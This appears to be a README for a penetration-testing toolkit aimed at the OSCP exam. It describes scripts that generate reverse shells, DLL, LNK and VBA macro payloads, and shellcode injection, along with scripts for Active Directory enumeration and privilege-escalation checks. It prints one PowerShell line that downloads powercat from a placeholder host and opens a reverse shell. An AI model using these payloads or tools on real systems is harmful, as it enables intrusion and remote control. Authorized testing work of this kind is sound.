# OSCP-Offensive-Tools
This project is a collection of Python and PowerShell scripts designed to assist penetration testers and security researchers in automating reverse shell generation, payload creation, and related tasks. Each tool in the project serves a specific purpose, such as creating reverse shells, encoding scripts, or injecting shellcode.

### 1. **`AD-basic-enum.ps1`**

- **Purpose**: Enumerate Active Directory objects (users, groups, computers).
- **How It Works**: Queries Active Directory to retrieve details using PowerShell cmdlets and outputs the results in an HTML report.
- **Parameters**:
	- `users` - Find user accounts
	- `computers` - Find computer accounts
	- `groups` - Find security groups
	- `domaincontrollers` - Find domain controllers
	- `serviceaccounts` - Find service accounts
	- `trusteddomains` - Find trusted domains
	- `ou` - Find organizational units
	- `printers` - Find printers
	- `sites` - Find AD sites
	- `contacts` - Find contacts
	- `foreignsecurity` - Find foreign security principals
	- `managedserviceaccounts` - Find managed service accounts
	- `gpos` - Find Group Policy Objects
	- `containers` - Find containers
	- `dynamicdistribution` - Find dynamic distribution groups
	- `subnets` - Find AD subnets
	- `sitelinks` - Find AD site links
	- `hosts` - Find host accounts
- **Example**:

```powershell
# Find all users
.\AD-basic-enum.ps1 users

# Find a specific user
.\AD-basic-enum.ps1 users jeff

# Find all groups
.\AD-basic-enum.ps1 groups

# Find a specific group
.\AD-basic-enum.ps1 groups "Domain Admins"
```
    
- **Outcome**: Generates an HTML report with detailed AD enumeration.

---

### 2. **`adduserstogroup.py`**

- **Purpose**: Add a user to an Active Directory group using LDAP.
- **How It Works**: Uses the `ldap3` library to connect to AD, search for the specified group and user, and modify the group membership.
- **Parameters**:
    - `--domain (-d)`: Domain name of the AD server.
    - `--group (-g)`: Group name to which the user will be added.
    - `--adduser (-a)`: Username to add.
    - `--user (-u)`: Username with privileges to add members.
    - `--password (-p)`: Password for the user.
- **Example**:

    `python3 adduserstogroup.py -d example.local -g "Administrators" -a "newuser" -u "admin" -p "password123"`
    
- **Outcome**: Adds the specified user to the group.

---

### 3. **`C-shells-creator.py`**

- **Purpose**: Generate C-based reverse shell payloads for Linux and Windows.
- **How It Works**: Creates customizable reverse shell C code using pre-defined templates, with an option to compile the generated code.
- **Parameters**:
    - `--ip`: Listener IP address.
    - `--port`: Listener port.
    - `--type`: Reverse shell type (`simple`, `stealth`, etc.).
    - `--system`: Target system (`linux`, `windows`).
    - `--output`: Output filename.
    - `--compile`: Compile the generated code (optional).
- **Example**:

    `python3 C-shells-creator.py --ip 192.168.1.10 --port 4444 --type simple --system linux --output shell.c --compile`
    
- **Outcome**: Produces and optionally compiles a reverse shell payload.

---

### 4. **`dll-shell-creator.py`**

- **Purpose**: Create `.dll` payloads with reverse shells or custom commands.
- **How It Works**: Generates a `.dll` file embedding commands using PowerShell or reverse shell commands.
- **Parameters**:
    - `--type`: Payload type (`reverse_shell`, `add_user`, `stealth_reverse_shell`, etc.).
    - `--ip`: Listener IP (required for reverse shell).
    - `--port`: Listener port (required for reverse shell).
    - `--username`: Username (required for `add_user`).
    - `--password`: Password (required for `add_user`).
    - `--command`: Custom command to execute (required for `execute_command`).
    - `--output`: Output filename.
    - `--compile`: Compile the generated DLL (optional).
- **Example**:
       
    `python3 dll-shell-creator.py --type reverse_shell --ip 192.168.1.10 --port 4444 --output ReverseShell.dll --compile`
    
- **Outcome**: Creates and optionally compiles a `.dll` payload.

---

### 5. **`encode-url-evo.py`**

- **Purpose**: Encode URLs with various techniques.
- **How It Works**: Provides multiple encoding methods (spaces-only, full encoding, double encoding, or `encodeURIComponent`).
- **Parameters**:
    - None (input URL is provided as an argument or prompted interactively).
- **Example**:

    `python3 encode-url-evo.py`
    
- **Outcome**: Outputs the URL in multiple encoded formats.

---

### 6. **`Library-ms_creator.py`**

- **Purpose**: Generate `.library-ms` files for custom Windows libraries.
- **How It Works**: Creates XML-based `.library-ms` files with customizable attributes like icon, folder type, and pinned state.
- **Parameters**:
    - `--ip`: Target folder IP or URL.
    - `--icon`: Library icon (`Documents`, `Music`, `Pictures`, etc.).
    - `--folder-type`: Folder type (`Documents`, `Music`, etc.).
    - `--pinned`: Whether the library is pinned (`YES`, `NO`).
    - `--output`: Output filename.
- **Example**:

    `python3 Library-ms_creator.py --ip "http://192.168.1.10" --icon "Documents" --output "MyLibrary"`
    
- **Outcome**: Produces a `.library-ms` file.

---

### 7. **`lnk-RevShell-creator.py`**

- **Purpose**: Generate `.lnk` files with embedded reverse shell commands.
- **How It Works**: Uses `win32com.client` to create `.lnk` files with PowerShell commands embedded.
- **Parameters**:
    - `--name`: Name of the shortcut file.
    - `--icon`: Shortcut icon (`Documents`, `Music`, etc.).
- **Example**:

    `python3 lnk-RevShell-creator.py --name "Important" --icon "Documents"`
    
- **Outcome**: Produces a `.lnk` file that executes a reverse shell.

---

### 8. **`Office-Macro-RevShell.py`**

- **Purpose**: Generate VBA macros containing reverse shell payloads.
- **How It Works**: Encodes PowerShell commands in Base64 and embeds them into a VBA macro.
- **Parameters**:
    - The PowerShell command is hardcoded and needs to be modified in the script.
- **Example**:

    `python3 Office-Macro-RevShell.py`
    
- **Harcoded input string**

	`IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell`
	
- **Outcome**: Outputs a VBA macro with an embedded reverse shell payload.

---

### 9. **`password-list-creator.py`**

- **Purpose**: Create password lists with common mutations.
- **How It Works**: Combines a list of usernames with common passwords and mutations.
- **Parameters**:
    - `--users`: Path to a file containing usernames.
- **Example**:

    `python3 password-list-creator.py --users usernames.txt`
    
- **Outcome**: Outputs a password list to `password_list.txt`.

---

### 10. **`PS-script-b64-encoder.py`**

- **Purpose**: Encode PowerShell scripts in Base64.
- **How It Works**: Cleans a PowerShell script and encodes it in Base64.
- **Parameters**:
    - `--script (-s)`: Path to the PowerShell script.
- **Example**:

    `python3 PS-script-b64-encoder.py --script ./script.ps1`
    
- **Outcome**: Produces a Base64-encoded PowerShell command.

---

### 11. **`ps-scriptblock-events.ps1`**

- **Purpose**: Analyze PowerShell script block logging events.
- **How It Works**: Extracts and analyzes logs from Windows Event Viewer.
- **Example**:

    `./ps-scriptblock-events.ps1`
    
- **Outcome**: Generates an HTML analysis report.

---

### 12. **`SearchStrings.ps1`**

- **Purpose**: Search for specific strings in files.
- **How It Works**: Iterates over specified files or directories to locate files containing the target strings.
- **Example**:

    `./SearchStrings.ps1`
    
- **Outcome**: Lists files containing the search string.

---

### 13. **`simple-shell.py`**

- **Purpose**: Generate reverse shell commands in various languages.
- **How It Works**: Provides templates for reverse shells in Bash, Python, PowerShell, and more.
- **Parameters**:
    - `--ip`: Listener IP address.
    - `--port`: Listener port.
    - `--type`: Shell type (e.g., `bash`, `python-linux`).
- **Example**:

    `python3 simple-shell.py --ip 192.168.1.10 --port 4444 --type bash`
    
- **Outcome**: Outputs the reverse shell command.

---

### 14. **`StringsSearchingTool.sh`**

- **Purpose**: Search for sensitive strings in Unix-like systems.
- **How It Works**: Greps through files or directories to locate specific strings.
- **Example**:

    `./StringsSearchingTool.sh /etc/ "root"`
    
- **Outcome**: Lists files containing the specified string.

---

### 15. **`SystemInfoReport.ps1`**

- **Purpose**: Collect detailed system information and generate a report.
- **How It Works**: Gathers information on users, privileges, services, and scheduled tasks.
- **Parameters**:
    - `-Output`: Path to save the HTML report.
- **Example**:

    `./SystemInfoReport.ps1`
    
- **Outcome**: Produces a comprehensive HTML report.

---

### 16. **`Thread-injection-generator.py`**

- **Purpose**: Generate obfuscated PowerShell scripts for injecting shellcode.
- **How It Works**: Creates a PowerShell script that allocates memory, writes shellcode, and executes it via `CreateThread`.
- **Example**:

    `python3 Thread-injection-generator.py`
    
- **Outcome**: Produces an obfuscated PowerShell script for injecting shellcode.

---

### 17. `tasks-sched.ps1`

- **Purpose**:  
    Extract and analyze scheduled tasks on a Windows system, filtering for tasks that execute `.exe` files.
    
- **How It Works**:
    
    1. Uses the `Get-ScheduledTask` cmdlet to retrieve all scheduled tasks.
    2. Gathers additional information about each task using `Get-ScheduledTaskInfo`.
    3. Filters tasks to include only those that run executable files (`*.exe`).
    4. For each matching task, extracts details such as task name, next run time, author, and the command to be executed.
    5. Formats the results as a list and outputs them to a file (`ScheduledTasks.txt`).
    
- **Example of Usage**:  
    Simply execute the script in a PowerShell session:
    
    `./tasks-sched.ps1`
    
- **Outcome**:  
    A file named `ScheduledTasks.txt` is generated in the current directory, containing a detailed list of scheduled tasks that execute `.exe` files. The output includes:

---

### 18. `vulnServices.ps1`

- **Purpose**:  
    Identify Windows services with modifiable binaries, which can be exploited for privilege escalation.
    
- **How It Works**:
    
    1. Retrieves the current user's identity and group memberships.
    2. Enumerates all services on the system using `Get-WMIObject` for `win32_service`.
    3. Extracts the binary path of each service and verifies its existence.
    4. Checks the permissions of the service binary using `icacls`.
    5. Identifies services where the current user or their groups have `Full Control (F)` or `Write (W)` permissions on the binary.
    6. Outputs details of vulnerable services, including the service name, binary path, and associated permissions.

- **Example of Usage**:  
    Execute the script in a PowerShell session:

    `./vulnServices.ps1`
    
- **Outcome**:  
    The script outputs a list of services with modifiable binaries.

---


## Disclaimer
This repository is intended for educational purposes and authorized penetration testing only. Use responsibly and ensure compliance with all applicable laws and regulations.

---

